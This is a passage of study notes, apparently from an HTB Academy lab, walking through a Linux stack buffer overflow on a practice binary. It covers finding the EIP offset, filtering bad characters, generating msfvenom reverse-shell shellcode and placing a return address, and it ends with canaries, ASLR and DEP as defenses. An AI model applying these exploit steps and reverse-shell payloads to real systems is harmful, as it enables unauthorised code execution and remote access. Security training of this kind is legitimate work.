<p>With such large input, the base of the stack is surpassed and we have overwritten the EIP with <code>\x55</code>. However, to write exactly into the EIP, we need to know exactly how many <code>\x55</code> characters we need to write to be at the EIP. Once we are at the EIP, the next 4 bytes will contain our desired memory address.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="determine-the-offset">Determine the offset<a href="#determine-the-offset" class="hash-link" aria-label="Direct link to Determine the offset" title="Direct link to Determine the offset">​</a></h2>
<p>To determine the offset, we can use Metasplit framework. It will create a unique pattern of the specified length. When passed as input to the program, we&#x27;ll see which part of the pattern leaks into the EIP. In this step, we want to cause a segmentation fault and see the registers at the end, i.e. don&#x27;t set any breakpoints.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 &gt; pattern.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat pattern.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9&#x27;&quot;) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: /home/student/bow/bow32 $(python -c &quot;print &#x27;Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9&#x27;&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x69423569 in ?? ()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) info registers eip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eip            0x69423569 0x69423569</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># We pass the found EIP address to a MSF utility and it will give us the exact offset to arrive to the EIP.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Exact match at offset 1036</span><br></span></code></pre></div></div>
<p>So, now we can write exactly at EIP with the following input:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) run $(python -c &quot;print &#x27;\x55&#x27; * 1036 + &#x27;\x66&#x27; * 4&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: /home/student/bow/bow32 $(python -c &quot;print &#x27;\x55&#x27; * 1036 + &#x27;\x66&#x27; * 4&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x66666666 in ?? ()</span><br></span></code></pre></div></div>
<p>Now EIP will contain <code>0x66666666</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="determine-the-length-of-the-shellcode">Determine the length of the shellcode<a href="#determine-the-length-of-the-shellcode" class="hash-link" aria-label="Direct link to Determine the length of the shellcode" title="Direct link to Determine the length of the shellcode">​</a></h2>
<p>The shellcode is the piece of software we&#x27;ll make the program execute by abusing of the stack. We&#x27;ll provide this executable piece of code as part of the input, and we&#x27;ll write its memory address into the EIP. In this case, we&#x27;ll write a reverse shell as a shellcode. In order to do so, we&#x27;ll use <code>msfvenom</code> tool:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder or badchars specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 68 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;SNIP&gt;</span><br></span></code></pre></div></div>
<p>We&#x27;ll need 68 bytes to accomodate our shellcode in memory. However, we&#x27;ll increase the requirement to accomodate more complex shellcode if needed.</p>
<p>In order to have some space to ensure the execution, we can add some No operation instruction (NO-OP) before the shell code begins.</p>
<p>Summarizing, our input data will look like this:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Buffer = &quot;\x55&quot; * (1040 - 100 - 150 - 4) = 786</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NOPs = &quot;\x90&quot; * 100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Shellcode = &quot;\x44&quot; * 150</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EIP = &quot;\x66&quot; * 4</span><br></span></code></pre></div></div>
<p>And visually:</p>
<p><img decoding="async" loading="lazy" alt="Memory contents with the shellcode" src="/docs/assets/images/stack-shellcode-5444e6e83658fb0a4be30917257ed440.jpg" width="1280" height="600" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="bad-characters">Bad characters<a href="#bad-characters" class="hash-link" aria-label="Direct link to Bad characters" title="Direct link to Bad characters">​</a></h2>
<p>Applications might contain some reserved bytes known as <code>bad characters</code>. If these bytes are passed as input, the program will just write 0x00 into the memory. When creating the shellcode, it is important to determine such bad characters to avoid having them in the shell code.</p>
<p>Here we use the following character list to find out all characters we have to consider and to avoid when generating our shellcode:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHARS=&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span><br></span></code></pre></div></div>
<p>The idea is that we&#x27;ll pass the whole list of chars in the input, so the input now will look like this:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Buffer = &quot;\x55&quot; * (1040 - 256 - 4) = 780</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHARS = &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfd\xfe\xff&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EIP = &quot;\x66&quot; * 4</span><br></span></code></pre></div></div>
<p>Now, we just need to place a breakpoint just after the input is read from memory to analyse the memory contents. This is done in gdb with <code>break &lt;function-name&gt;</code>:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) break bowfunc </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1 at 0x56555551</span><br></span></code></pre></div></div>
<p>and then, we send the input and examine the memory</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) run $(python -c &#x27;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: /home/student/bow/bow32 $(python -c &#x27;print &quot;\x55&quot; * (1040 - 256 - 4) + &quot;\x00\x01\x02\x03\x04\x05...&lt;SNIP&gt;...\xfc\xfd\xfe\xff&quot; + &quot;\x66&quot; * 4&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/bash: warning: command substitution: ignored null byte in input</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1, 0x56555551 in bowfunc ()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Examine the memory: 2000 units, in hexadecimal (x) and each unit is 1 byte(b). Start at ESP (top of the stack)+ 500 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x/2000xb $esp+500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;SNIP&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5aa: 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5b2: 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5ba: 0x55 0x55 0x55 0x55 0x55 0x01 0x02 0x03</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             # |---&gt; CHARS begin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5c2: 0x04 0x05 0x06 0x07 0x08 0x00 0x0b 0x0c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5ca: 0x0d 0x0e 0x0f 0x10 0x11 0x12 0x13 0x14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5d2: 0x15 0x16 0x17 0x18 0x19 0x1a 0x1b 0x1c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;SNIP&gt;</span><br></span></code></pre></div></div>
<p>We see that the first byte in CHARS, <code>0x00</code> is not present, hence we cannot use <code>0x00</code> in the shellcode as it is a bad character. In similar way, we see that <code>0x09</code> is not present and is substituted by <code>0x00</code>. Therefore, we can determine that <code>0x09</code> is also a bad character and should not be used in the shellcode.</p>
<p>This process must be repeated until all characters that could interrupt the flow are removed.</p>
<p>Usually bad characters are: &quot;\x00\x09\x0a\x20&quot;</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="generating-the-shellcode">Generating the shellcode<a href="#generating-the-shellcode" class="hash-link" aria-label="Direct link to Generating the shellcode" title="Direct link to Generating the shellcode">​</a></h2>
<p>Now we can tell <code>msfvenom</code> we don&#x27;t want to use those bad characters in the shellcode:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars &quot;\x00\x09\x0a\x20&quot; --out shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Found 11 compatible encoders</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai succeeded with size 95 (iteration=0)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">x86/shikata_ga_nai chosen with final size 95</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 95 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of c file: 425 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Saved as: shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">adriangalera@htb[/htb]$ cat shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char buf[] = </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;SNIP&gt;</span><br></span></code></pre></div></div>
<p>Finally our input will look like this:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Buffer = &quot;\x55&quot; * (1040 - 124 - 95 - 4) = 817</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NOPs = &quot;\x90&quot; * 124</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Shellcode = &quot;\xda\xca\xba\xe4\x11...&lt;SNIP&gt;...\x5a\x22\xa2&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EIP = &quot;\x66&quot; * 4&#x27;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="identification-of-the-return-address">Identification of the Return Address<a href="#identification-of-the-return-address" class="hash-link" aria-label="Direct link to Identification of the Return Address" title="Direct link to Identification of the Return Address">​</a></h2>
<p>now need a memory address where our NOPs are located to tell the EIP to jump to it. This memory address must not contain any of the bad characters we found previously. Since NOPs will not do anything, it&#x27;s completely fine to start the execution there. Examining the memory:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) x/2000xb $esp+1400</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;SNIP&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5ec: 0x55 0x55 0x55 0x55 0x55 0x55 0x55 0x55</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5f4: 0x55 0x55 0x55 0x55 0x55 0x55 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        # End of &quot;\x55&quot;s   ----&gt;|  |---&gt; NOPS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd5fc: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd604: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd60c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd614: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd61c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd624: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd62c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd634: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd63c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd644: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd64c: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd654: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0xffffd65c: 0x90 0x90 0xda 0xca 0xba 0xe4 0x11 0xd4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       # |---&gt; Shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;SNIP&gt;</span><br></span></code></pre></div></div>
<p>Here, we can select for example the position <code>0xffffd64c</code>. Now the payload will be:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Buffer = &quot;\x55&quot; * (1040 - 100 - 95 - 4) = 841</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NOPs = &quot;\x90&quot; * 100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Shellcode = &quot;\xda\xca\xba\xe4\x11\xd4...&lt;SNIP&gt;...\x5a\x22\xa2&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EIP = &quot;\x4c\xd6\xff\xff&quot;</span><br></span></code></pre></div></div>
<p>Note that the input of the address is entered backwards.</p>
<p>Since the shellcode is a reverse shell, when the payload is executed, we&#x27;ll get a connection in the other side.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="prevention-techniques-and-mechanisms">Prevention techniques and mechanisms<a href="#prevention-techniques-and-mechanisms" class="hash-link" aria-label="Direct link to Prevention techniques and mechanisms" title="Direct link to Prevention techniques and mechanisms">​</a></h2>
<p>The best protection against buffer overflows is security-conscious programming. However, there are some mechanisms that will help with buffer overflow vulnerabilities.</p>
<ul>
<li>
<p>Canaries: canaries are known values written to the stack between buffer and control data to detect overflows. If a buffer overflow happens, the known values of the canaries will be altered and the operating system will detect that canary is overwitten.</p>
</li>
<li>
<p>Address Space Layout Randomization (ASLR): it makes difficult to find addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us.</p>
</li>
<li>
<p>Data Execution Prevention (DEP): programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.</p>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="python2-vs-python3">Python2 vs Python3<a href="#python2-vs-python3" class="hash-link" aria-label="Direct link to Python2 vs Python3" title="Direct link to Python2 vs Python3">​</a></h2>
<p>All previous usages of <code>python</code> are Python2.x. In python 3.x <code>print</code> function re-encodes the bytes. For example: it will re-encode the Unicode &#x27;\x90&#x27; and may produce 0xC2 0x90 instead of 0x90.</p>
<p>For python3 it is better to generate a binary file and pass the contents of it to the gdb run command. For example:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 -c &quot;open(&#x27;/tmp/p.bin&#x27;,&#x27;wb&#x27;).write(b&#x27;\x55&#x27;*1960 + b&#x27;\x90&#x27;*100 + b&#x27;\x66&#x27;*4)&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r $(cat /tmp/p.bin)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="gdb-or-normal-execution">gdb or normal execution<a href="#gdb-or-normal-execution" class="hash-link" aria-label="Direct link to gdb or normal execution" title="Direct link to gdb or normal execution">​</a></h2>
<p>Bear in mind that when the program is run from <code>gdb</code>, the user that is running the program might be different than the normal execution. In some example the binary will lead to root access while running the binary from gdb will lead to normal user.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
<p>The whole process can be summarized with:</p>
<ul>
<li>Provide a very large input to see if the binary is vulnerable to buffer overflow.</li>
<li>Once we knwow it is vulnerable, we need to know the offset to write the EIP pointer.</li>
<li>We need to identify what characters and what not can be used in the shellcode.</li>
<li>Create the shellcode avoiding the bad characters</li>
<li>Jumping to Shellcode: find the proper memory address to write in the EIP.</li>
</ul></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/Hacking/HTB Academy/SQL injections"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">SQL injections</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Hacking/HTB Academy/Stack-based buffer overflow on Windows"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Stack based buffer overflow on Windows</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#memory-structure" class="table-of-contents__link toc-highlight">Memory structure</a></li><li><a href="#gdb-introduction" class="table-of-contents__link toc-highlight">GDB Introduction</a></li><li><a href="#cpu-registers" class="table-of-contents__link toc-highlight">CPU Registers</a></li><li><a href="#endianness" class="table-of-contents__link toc-highlight">Endianness</a></li><li><a href="#taking-control-of-eip" class="table-of-contents__link toc-highlight">Taking control of EIP</a></li><li><a href="#determine-the-offset" class="table-of-contents__link toc-highlight">Determine the offset</a></li><li><a href="#determine-the-length-of-the-shellcode" class="table-of-contents__link toc-highlight">Determine the length of the shellcode</a></li><li><a href="#bad-characters" class="table-of-contents__link toc-highlight">Bad characters</a></li><li><a href="#generating-the-shellcode" class="table-of-contents__link toc-highlight">Generating the shellcode</a></li><li><a href="#identification-of-the-return-address" class="table-of-contents__link toc-highlight">Identification of the Return Address</a></li><li><a href="#prevention-techniques-and-mechanisms" class="table-of-contents__link toc-highlight">Prevention techniques and mechanisms</a></li><li><a href="#python2-vs-python3" class="table-of-contents__link toc-highlight">Python2 vs Python3</a></li><li><a href="#gdb-or-normal-execution" class="table-of-contents__link toc-highlight">gdb or normal execution</a></li><li><a href="#summary" class="table-of-contents__link toc-highlight">Summary</a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>